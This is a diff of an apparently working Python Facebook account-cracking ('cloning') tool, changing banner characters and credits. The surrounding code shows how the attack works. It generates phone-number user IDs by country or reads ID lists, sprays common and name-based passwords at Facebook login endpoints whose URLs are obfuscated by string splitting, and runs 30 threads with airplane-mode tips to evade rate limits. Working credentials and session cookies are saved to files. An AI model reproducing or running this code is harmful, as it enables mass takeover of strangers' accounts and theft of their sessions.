@@ -7,7 +7,7 @@ from os import system as cmd
 from concurrent.futures import ThreadPoolExecutor as tred
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 os.system('clear')
-print(f'\x1b[38;5;160m[\033[1;37m√\x1b[38;5;160m]\x1b[38;5;46m installing site package please wait ...\n')
+print(f'\x1b[38;5;160m[\033[1;37m✓\x1b[38;5;160m]\x1b[38;5;46m installing site package please wait ...\n')
 time.sleep(5)
 os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
 try:
@@ -244,12 +244,12 @@ logo=(f"""
 {faltu} {black}"If you get tired, learn to rest, not to quit".... {pvt}
 {green}╔═╗╦ ╦╔═╗╔╦╗╦ ╦╔╦╗ |\033[1;32m[\033[1;31m✓\033[1;32m] DATE       : \033[1;32m{today}
 {green}╚═╗╚╦╝╚═╗ ║ ║ ║║║║ |\033[1;32m[\033[1;31m✓\033[1;32m] COUNTRY    : \033[1;32m{current_country}
-{green}╚═╝ ╩ ╚═╝ ╩ ╚═╝╩ ╩ |\033[1;32m[\033[1;31m✓\033[1;32m] YOUR CITY  : \033[1;32m{current_city}
+{green}╚═╝ ╩ ╚═╝ ╩ ╚═╝╩ ╩ |\033[1;32m[\033[1;31m✓\033[1;32m] YOUR CITY  : \033[1;32m{current_city}    ‼️\x1b[38;1;97m ᴾᴿᴼ
 {white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-{red}[{white}√{red}]{green} DEVELOPER {white}▶ {green}︎MR ERROR
-{red}[{white}√{red}]{green} TOOLTYPE {white} ▶︎{green} FREE {red}({green}FILE {white}& {green}RANDOM{red})
-{red}[{white}√{red}]{green} GITHUB    {white}▶︎ github.com/MR-ERROR-707
-{red}[{white}√{red}]{green} VERSION   {white}▶ {green}︎{version}
+{red}[{white}✓{red}]{green} ONWER AND CEO{white}▶︎ {green}𝐜𝐡𝐨𝐲𝐨𝐧 {green}𝐗 {green}𝐬𝐮𝐦𝐨𝐧
+{red}[{white}✓{red}]{green} ABOUTS       {white}▶︎{green} a script designed to attempt logins
+{red}[{white}✓{red}]{green} VERSION      {white}▶ {green}︎{version}
+{red}[{white}✓{red}]{green} THIS TOOL {faltu} {black}FILE{pvt} {green}& {faltu} {black}RANDOM{pvt} {green}TYPES
 {white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 """)
 
@@ -342,20 +342,20 @@ def ___BD___():
         
     elif __CH__ in ["B","b","2"]:
         clear()
-        psl = int(input(f'{red}[{white}√{red}] {green}INPUT PASS LIMITS {white}▶︎ {red}'));line()
-        print(f"{red}[{white}√{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8{red}]")
+        psl = int(input(f'{red}[{white}✓{red}] {green}INPUT PASS LIMITS {white}▶︎ {red}'));line()
+        print(f"{red}[{white}✓{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8{red}]")
         line()
         for i in range(psl):
-            plist.append(input(f'{red}[{white}√{red}] {green}PASSWORD NO-{i+1} {white}▶︎ \x1b[38;5;208m'));line()
+            plist.append(input(f'{red}[{white}✓{red}] {green}PASSWORD NO-{i+1} {white}▶︎ \x1b[38;5;208m'));line()
     for x in range(limit):
         nmp = "". join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
     clear()
     with ThreadPoolExecutor(max_workers=30) as error:
         clear()
-        print(f'{red}[{white}√{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{mtd}')
-        print(f'{red}[{white}√{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
-        print(f'{red}[{white}√{red}]{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY {white}3{green} MIN');line()
+        print(f'{red}[{white}✓{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{mtd}')
+        print(f'{red}[{white}✓{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
+        print(f'{red}[{white}✓{red}]{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY {white}3{green} MIN');line()
         for love in user:
             ids = code + love
             ax = ids[:8]
@@ -370,11 +370,11 @@ def ___BD___():
             elif mtd in ['C','c','03','3']:error.submit(randm2, ids, psd,tl)
             elif mtd in ['D','d','04','4']:error.submit(randm3, ids, psd,tl)
     print(f'\r{white}================================================')
-    print(f'{red}[{white}√{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
-    print(f'{red}[{white}√{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
-    print(f'{red}[{white}√{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
+    print(f'{red}[{white}✓{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
+    print(f'{red}[{white}✓{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
+    print(f'{red}[{white}✓{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
     print(f'\r{white}================================================')
-    input(f"{red}[{white}√{red}]{green} PRESS ENTER TO BACK MENU ")
+    input(f"{red}[{white}✓{red}]{green} PRESS ENTER TO BACK MENU ")
     ___ERROR___()
         
 #====================[INDIA RANDOM]==========================
@@ -399,20 +399,20 @@ def ___INDIA___():
         plist.append('07860786')
         
     elif __CH__ in ["B","b","2"]:
-        psl = int(input(f'{red}[{white}√{red}] {green}INPUT PASS LIMITS {white}▶︎ \x1b[38;5;208m'));line()
-        print(f"{red}[{white}√{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8")
+        psl = int(input(f'{red}[{white}✓{red}] {green}INPUT PASS LIMITS {white}▶︎ \x1b[38;5;208m'));line()
+        print(f"{red}[{white}✓{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8")
         line()
         for i in range(psl):
-            plist.append(input(f'{red}[{white}√{red}] {green}PASSWORD NO.{i+1} {white}▶︎ \x1b[38;5;208m'));line()
+            plist.append(input(f'{red}[{white}✓{red}] {green}PASSWORD NO.{i+1} {white}▶︎ \x1b[38;5;208m'));line()
     for x in range(limit):
         nmp = "". join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
     clear()
     with ThreadPoolExecutor(max_workers=30) as error:
         clear()
-        print(f'{red}[{white}√{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{___error___}')
-        print(f'{red}[{white}√{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
-        print(f'{red}[{white}√{red}]{green} TURN {green}[{white}ON{white}/{white}OFF{green}]{green} AIRPLANE MODE EVERY {white}3{green} MIN');line()
+        print(f'{red}[{white}✓{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{___error___}')
+        print(f'{red}[{white}✓{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
+        print(f'{red}[{white}✓{red}]{green} TURN {green}[{white}ON{white}/{white}OFF{green}]{green} AIRPLANE MODE EVERY {white}3{green} MIN');line()
         for love in user:
             ids = code + love
             tl = len(user)
@@ -422,11 +422,11 @@ def ___INDIA___():
             elif ___error___ in ['C','c','03','3']:error.submit(randm2, ids, psd,tl)
             elif ___error___ in ['D','d','04','4']:error.submit(randm3, ids, psd,tl) 
     print(f'\r{white}================================================')
-    print(f'{red}[{white}√{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
-    print(f'{red}[{white}√{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
-    print(f'{red}[{white}√{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
+    print(f'{red}[{white}✓{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
+    print(f'{red}[{white}✓{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
+    print(f'{red}[{white}✓{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
     print(f'\r{white}================================================')
-    input(f"{red}[{white}√{red}]{green} PRESS ENTER TO BACK MENU ")
+    input(f"{red}[{white}✓{red}]{green} PRESS ENTER TO BACK MENU ")
     ___ERROR___()
 #====================[MALAYSIA RANDOM]==========================
 def ___ML___():
@@ -462,20 +462,20 @@ def ___ML___():
         plist.append('jannat')
         plist.append('arafat')
     elif __CH__ in ["B","b","2"]:
-        psl = int(input(f'{red}[{white}√{red}] {green}INPUT PASS LIMITS {white}▶︎ \x1b[38;5;208m'));line()
-        print(f"{red}[{white}√{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8")
+        psl = int(input(f'{red}[{white}✓{red}] {green}INPUT PASS LIMITS {white}▶︎ \x1b[38;5;208m'));line()
+        print(f"{red}[{white}✓{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8")
         line()
         for i in range(psl):
-            plist.append(input(f'{red}[{white}√{red}] {green}PASSWORD NO.{i+1} {white}▶︎ \x1b[38;5;208m'));line()
+            plist.append(input(f'{red}[{white}✓{red}] {green}PASSWORD NO.{i+1} {white}▶︎ \x1b[38;5;208m'));line()
     for x in range(limit):
         nmp = "". join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
     clear()
     with ThreadPoolExecutor(max_workers=30) as error:
         clear()
-        print(f'{red}[{white}√{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{mtd}')
-        print(f'{red}[{white}√{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
-        print(f'{red}[{white}√{red}]{green} TURN {green}[{white}ON{white}/{white}OFF{green}]{green} AIRPLANE MODE EVERY {white}3{green} MIN');line()
+        print(f'{red}[{white}✓{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{mtd}')
+        print(f'{red}[{white}✓{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
+        print(f'{red}[{white}✓{red}]{green} TURN {green}[{white}ON{white}/{white}OFF{green}]{green} AIRPLANE MODE EVERY {white}3{green} MIN');line()
         for love in user:
             ids = code + love
             ax = ids[:8]
@@ -490,11 +490,11 @@ def ___ML___():
             elif mtd in ['D','d','04','4']:error.submit(randm3, ids, plist,tl)
     print('')
     print(f'\r{white}================================================')
-    print(f'{red}[{white}√{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
-    print(f'{red}[{white}√{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
-    print(f'{red}[{white}√{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
+    print(f'{red}[{white}✓{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
+    print(f'{red}[{white}✓{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
+    print(f'{red}[{white}✓{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
     print(f'\r{white}================================================')
-    input(f"{red}[{white}√{red}]{green} PRESS ENTER TO BACK MENU ")
+    input(f"{red}[{white}✓{red}]{green} PRESS ENTER TO BACK MENU ")
     ___ERROR___()
 #====================[PAKISTAN RANDOM]==========================
 def ___PK___():
@@ -531,20 +531,20 @@ def ___PK___():
         plist.append('203040')
     elif __CH__ in ["B","b","2"]:
         clear()
-        psl = int(input(f'{red}[{white}√{red}] {green}INPUT PASS LIMITS {white}▶︎ \x1b[38;5;208m'));line()
-        print(f"{red}[{white}√{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8")
+        psl = int(input(f'{red}[{white}✓{red}] {green}INPUT PASS LIMITS {white}▶︎ \x1b[38;5;208m'));line()
+        print(f"{red}[{white}✓{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8")
         line()
         for i in range(psl):
-            plist.append(input(f'{red}[{white}√{red}] {green}PASSWORD NO.{i+1} {white}▶︎ \x1b[38;5;208m'));line()
+            plist.append(input(f'{red}[{white}✓{red}] {green}PASSWORD NO.{i+1} {white}▶︎ \x1b[38;5;208m'));line()
     for x in range(limit):
         nmp = "". join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
     clear()
     with ThreadPoolExecutor(max_workers=30) as error:
         clear()
-        print(f'{red}[{white}√{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{mtd}')
-        print(f'{red}[{white}√{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
-        print(f'{red}[{white}√{red}]{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY {white}3{green} MIN');line()
+        print(f'{red}[{white}✓{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{mtd}')
+        print(f'{red}[{white}✓{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
+        print(f'{red}[{white}✓{red}]{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY {white}3{green} MIN');line()
         for love in user:
             ids = code + love
             ax = ids[:8]
@@ -560,11 +560,11 @@ def ___PK___():
             elif mtd in ['D','d','04','4']:error.submit(randm3, ids, psd,tl)
     print('')
     print(f'\r{white}================================================')
-    print(f'{red}[{white}√{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
-    print(f'{red}[{white}√{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
-    print(f'{red}[{white}√{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
+    print(f'{red}[{white}✓{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
+    print(f'{red}[{white}✓{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
+    print(f'{red}[{white}✓{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
     print(f'\r{white}================================================')
-    input(f"{red}[{white}√{red}]{green} PRESS ENTER TO BACK MENU ")
+    input(f"{red}[{white}✓{red}]{green} PRESS ENTER TO BACK MENU ")
     ___ERROR___()
  #====================[NEPAL RANDOM]==========================
 def ___NP___():
@@ -606,20 +606,20 @@ def ___NP___():
         plist.append("kathmandu123")
     elif __CH__ in ["B","b","2"]:
         clear()
-        psl = int(input(f'{red}[{white}√{red}] {green}INPUT PASS LIMITS {white}▶︎ \x1b[38;5;208m'));line()
-        print(f"{red}[{white}√{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8")
+        psl = int(input(f'{red}[{white}✓{red}] {green}INPUT PASS LIMITS {white}▶︎ \x1b[38;5;208m'));line()
+        print(f"{red}[{white}✓{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8")
         line()
         for i in range(psl):
-            plist.append(input(f'{red}[{white}√{red}] {green}PASSWORD NO.{i+1} {white}▶︎ \x1b[38;5;208m'));line()
+            plist.append(input(f'{red}[{white}✓{red}] {green}PASSWORD NO.{i+1} {white}▶︎ \x1b[38;5;208m'));line()
     for x in range(limit):
         nmp = "". join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
     clear()
     with ThreadPoolExecutor(max_workers=30) as error:
         clear()
-        print(f'{red}[{white}√{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{mtd}')
-        print(f'{red}[{white}√{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
-        print(f'{red}[{white}√{red}]{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY {white}3{green} MIN');line()
+        print(f'{red}[{white}✓{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{mtd}')
+        print(f'{red}[{white}✓{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
+        print(f'{red}[{white}✓{red}]{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY {white}3{green} MIN');line()
         for love in user:
             ids = code + love
             ax = ids[:8]
@@ -635,36 +635,36 @@ def ___NP___():
             elif mtd in ['D','d','04','4']:error.submit(randm3, ids, psd,tl)
     print('')
     print(f'\r{white}================================================')
-    print(f'{red}[{white}√{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
-    print(f'{red}[{white}√{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
-    print(f'{red}[{white}√{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
+    print(f'{red}[{white}✓{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
+    print(f'{red}[{white}✓{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
+    print(f'{red}[{white}✓{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
     print(f'\r{white}================================================')
-    input(f"{red}[{white}√{red}]{green} PRESS ENTER TO BACK MENU ")
+    input(f"{red}[{white}✓{red}]{green} PRESS ENTER TO BACK MENU ")
     ___ERROR___()
 #====================[FILE CLONE MENU]==========================
 def ___FILE___():
     global methods
     clear()
-    print(f'{red}[{white}√{red}] {green}EXAMPLE {red}[{white}sdcard/mrerror.txt{red}]');line()
-    dfile = input(f'{red}[{white}√{red}] {green}INPUT FILE PATH {white}▶︎ \x1b[38;5;208m');line();clear()
+    print(f'{red}[{white}✓{red}] {green}EXAMPLE {red}[{white}sdcard/mrerror.txt{red}]');line()
+    dfile = input(f'{red}[{white}✓{red}] {green}INPUT FILE PATH {white}▶︎ \x1b[38;5;208m');line();clear()
     try:
         dx = open(dfile,'r').read().splitlines()
     except FileNotFoundError:
         print(f'{red}[{white}×{red}] FILE NOT FOUND...');time.sleep(1);___FILE___()
     dplist = []
     try:
-        pass_lmit = int(input(f'{red}[{white}√{red}] {green}INPUT PASS LIMITS {white}▶︎ {yellow}'));line()
+        pass_lmit = int(input(f'{red}[{white}✓{red}] {green}INPUT PASS LIMITS {white}▶︎ {yellow}'));line()
     except:
         pass_lmit = 3
-    print(f'{red}[{white}√{red}] {green}EXAMPLE {red}[{white}firstlast first123 ETC{red}]')
+    print(f'{red}[{white}✓{red}] {green}EXAMPLE {red}[{white}firstlast first123 ETC{red}]')
     line()
     for i in range(pass_lmit):        
-        dplist.append(input(f'{red}[{white}√{red}] {green}PASSWORD NO.{i+1} {white}▶︎ {yellow}'));line()
+        dplist.append(input(f'{red}[{white}✓{red}] {green}PASSWORD NO.{i+1} {white}▶︎ {yellow}'));line()
     __METHOD__ = input(f"{red}[{white}A{red}]{green} METHOD M1 \n{red}[{white}B{red}] {green}METHOD M2 \n{red}[{white}C{red}] {green}METHOD M3 \n{red}[{white}D{red}] {green}METHOD M4 \n{red}[{white}E{red}] {green}METHOD M5 \n{red}[{white}F{red}] {green}METHOD M6{white}\n==============================================\n{red}[{white}◆{red}] {green}SELECTION {white}▶︎ \x1b[38;5;208m");clear()
     with ThreadPoolExecutor(max_workers=30) as error:
         clear()
-        print(f'{red}[{white}√{red}] {green}TOTAL IDS {white}▶ ︎{len(dx)}{white} > {green}METHOD {white}▶︎ \x1b[38;5;38m{__METHOD__}')
-        print(f'{red}[{white}√{red}] {green}IF NO RESULT [{white}On/Off{green}] AIRPLANE MODE')
+        print(f'{red}[{white}✓{red}] {green}TOTAL IDS {white}▶ ︎{len(dx)}{white} > {green}METHOD {white}▶︎ \x1b[38;5;38m{__METHOD__}')
+        print(f'{red}[{white}✓{red}] {green}IF NO RESULT [{white}On/Off{green}] AIRPLANE MODE')
         line()
         for user in dx:
             ids,names = user.split('|')
@@ -686,11 +686,11 @@ def ___FILE___():
                 error.submit(__MTDONEE__,ids,names,passlist,tl)
     print('')
     print(f'\r{white}================================================')
-    print(f'{red}[{white}√{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
-    print(f'{red}[{white}√{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
-    print(f'{red}[{white}√{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
+    print(f'{red}[{white}✓{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
+    print(f'{red}[{white}✓{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
+    print(f'{red}[{white}✓{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
     print(f'\r{white}================================================')
-    input(f"{red}[{white}√{red}]{green} PRESS ENTER TO BACK MENU ")
+    input(f"{red}[{white}✓{red}]{green} PRESS ENTER TO BACK MENU ")
     ___ERROR___()
 #====================[FILE M1]==========================
 try:
@@ -698,7 +698,7 @@ try:
         try:
             global oks,cps,loop
             abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-            sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+            sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -748,7 +748,7 @@ try:
                 q = json.loads(po)
                 if 'session_key' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                    print(f"\r\r{red}[{white}√{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
+                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
                     open('/sdcard/ERROR-FILE-M1.txt','a').write(sid+'|'+ps+'\n')
                     open('/sdcard/ERROR-FILE-M1-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     oks.append(sid)
@@ -766,7 +766,7 @@ try:
         try:
             global oks,cps,loop
             abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-            sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+            sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -820,7 +820,7 @@ try:
                 q = session.post("https://api.face"+"book.com/au"+"th/lo"+"gin",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                    print(f"\r\r{red}[{white}√{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
+                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
                     open('/sdcard/ERROR-FILE-M2.txt','a').write(sid+'|'+ps+'\n')
                     open('/sdcard/ERROR-FILE-M2-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     oks.append(sid)
@@ -838,7 +838,7 @@ try:
         try:
             global oks,cps,loop
             abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-            sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+            sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -892,7 +892,7 @@ try:
                 q = session.post("htt"+"ps:"+"//b-"+"gra"+"ph.fa"+"ceboo"+"k.com"+"/auth"+"/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                    print(f"\r\r{red}[{white}√{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
+                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
                     open('/sdcard/ERROR-FILE-M3.txt','a').write(sid+'|'+ps+'\n')
                     open('/sdcard/ERROR-FILE-M3-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     oks.append(sid)
@@ -910,7 +910,7 @@ try:
         try:
             global oks,cps,loop
             abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-            sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+            sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -955,7 +955,7 @@ try:
                 q = session.post("htt"+"ps:"+"//b-"+"gra"+"ph.fa"+"ceboo"+"k.com"+"/auth"+"/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                    print(f"\r\r{red}[{white}√{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
+                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
                     open('/sdcard/ERROR-FILE-M4.txt','a').write(sid+'|'+ps+'\n')
                     open('/sdcard/ERROR-FILE-M4-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     oks.append(sid)
@@ -973,7 +973,7 @@ try:
         try:
             global oks,cps,loop
             abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-            sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+            sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -1029,7 +1029,7 @@ try:
                 q = session.post("htt"+"ps:"+"//b-"+"gra"+"ph.fa"+"ceboo"+"k.com"+"/auth"+"/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                    print(f"\r\r{red}[{white}√{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
+                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
                     open('/sdcard/ERROR-FILE-M5.txt','a').write(sid+'|'+ps+'\n')
                     open('/sdcard/ERROR-FILE-M5-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     oks.append(sid)
@@ -1047,7 +1047,7 @@ except:pass
 def __MTDONE6__(ids,names,passlist,tl):
     global oks,cps,loop
     abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-    sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+    sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
     sys.stdout.flush()
     try:
         first = names.split(' ')[0]
@@ -1102,7 +1102,7 @@ def __MTDONE6__(ids,names,passlist,tl):
             q = json.loads(po)
             if 'session_key' in q:
                 cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                print(f"\r\r{red}[{white}√{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
+                print(f"\r\r{red}[{white}✓{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
                 open('/sdcard/ERROR-FILE-M6.txt','a').write(sid+'|'+ps+'\n')
                 open('/sdcard/ERROR-FILE-M6-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                 oks.append(sid)
@@ -1122,7 +1122,7 @@ def __MTDONE6__(ids,names,passlist,tl):
 def randm(ids,psd,tl):
     global oks,cps,loop
